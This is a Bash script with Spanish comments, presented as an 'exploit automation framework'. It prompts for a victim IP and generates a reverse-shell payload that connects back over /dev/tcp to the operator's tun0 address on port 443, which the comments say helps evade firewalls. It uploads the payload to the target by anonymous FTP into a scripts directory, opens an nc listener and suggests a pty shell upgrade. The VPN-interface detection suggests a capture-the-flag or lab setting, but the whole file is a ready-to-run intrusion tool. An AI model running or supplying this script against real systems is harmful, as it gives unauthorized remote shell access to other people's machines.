#!/bin/bash

# --- CONFIGURACIÓN DE ENTORNO (PRO) ---
# Usamos tput para máxima compatibilidad de terminal
verde=$(tput setaf 2); rojo=$(tput setaf 1); amarillo=$(tput setaf 3); reset=$(tput sgr0)
bold=$(tput bold)

# Funciones de Logging para un diseño limpio
log_status() { echo -e "${verde}${bold}[+]${reset} $1"; }
log_error() { echo -e "${rojo}${bold}[!]${reset} $1"; }
log_info() { echo -e "${amarillo}${bold}[*]${reset} $1"; }

# --- 1. PREPARACIÓN DE VARIABLES ---
clear
echo -e "${amarillo}--- EXPLOIT AUTOMATION FRAMEWORK v2.0 ---${reset}\n"

read -p "${bold}[?] IP de la víctima: ${reset}" ip_victima

# Validación de IP mediante RegEx
if [[ ! $ip_victima =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    log_error "Dirección IP inválida. Abortando."; exit 1
fi

# Detección dinámica de IP Local (Prioriza VPN/tun0 sobre red local)
ip_local=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
           ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$ip_local" ]; then
    log_error "No se detectó interfaz de red activa."; exit 1
fi

log_status "Tu IP: ${bold}$ip_local${reset} | Objetivo: ${bold}$ip_victima${reset}"

# --- 2. GENERACIÓN DE PAYLOAD DINÁMICO ---
payload="cleon.sh"
lport=443 # Usar el 443 es "Pro" porque suele evadir firewalls salientes

log_info "Generando payload persistente en $payload..."
cat <<EOF > $payload
#!/bin/bash
# Evadir cuelgues del terminal de la víctima
(nohup bash -i >& /dev/tcp/$ip_local/$lport 0>&1 &) 2>/dev/null
EOF
chmod +x $payload

# --- 3. INFILTRACIÓN VÍA FTP (MODO SILENCIOSO) ---
log_info "Infiltrando payload vía FTP..."

# -sS oculta el progreso pero muestra errores; --connect-timeout evita cuelgues
if curl -sS --connect-timeout 5 -T "$payload" "ftp://$ip_victima/scripts/$payload" --user "anonymous:"; then
    log_status "Transferencia exitosa: ftp://$ip_victima/scripts/$payload"
else
    log_error "Fallo en la subida. Verifique permisos de escritura en el servidor FTP."
    rm $payload; exit 1
fi

# --- 4. LANZAMIENTO DEL LISTENER (STABILIZED READY) ---
log_info "Abriendo listener en puerto $lport..."
log_info "RECUERDA: Una vez dentro, usa: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

# -n (No DNS) y -v (Verbose) son estándar pro
sudo nc -lvnp $lport

# --- 5. LIMPIEZA POST-OPERACIÓN ---
echo ""
read -p "${amarillo}[?] ¿Deseas limpiar los archivos temporales? (s/n): ${reset}" clean
if [[ "$clean" == "s" ]]; then
    rm $payload
    log_status "Sistema local limpio."
fi
